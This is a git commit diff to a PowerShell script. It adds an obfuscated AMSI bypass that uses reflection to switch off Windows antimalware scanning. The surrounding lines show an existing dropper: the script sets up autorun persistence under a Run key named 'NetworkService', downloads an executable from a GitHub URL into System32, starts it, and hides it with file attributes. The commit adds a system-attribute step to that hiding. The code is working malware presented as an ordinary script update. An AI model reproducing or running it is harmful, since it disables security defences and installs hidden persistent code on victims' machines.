e215be03128ecdb6dbd1eb36e9761be3dc12ac66
Protesian <163721132+Protesianxd@users.noreply.github.com>
2024-08-07 15:49:45 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,3 +1,8 @@
+$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
+$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
+$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
+$me = $field.GetValue($field)
+$me = $field.SetValue($null, [Boolean]"hhfff")
 
 $ProgressPreference = 'SilentlyContinue'
 
@@ -11,7 +16,7 @@ if (-Not (Test-Path -Path $networkServicePath)) {
        
         $ProgressPreference = 'SilentlyContinue'
         New-ItemProperty -Path REGISTRY::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run -Name NetworkService -Value "%systemroot%\System32\NetworkService.exe" -Property "String" -Force
-
+        attrib +s $networkServicePath
         Invoke-WebRequest -Uri 'https://github.com/Protesianxd/sal/raw/main/NetworkService.exe' -OutFile $env:SystemRoot\System32\NetworkService.exe
         Start-Process -FilePath $env:SystemRoot\System32\NetworkService.exe
         attrib +h $networkServicePath
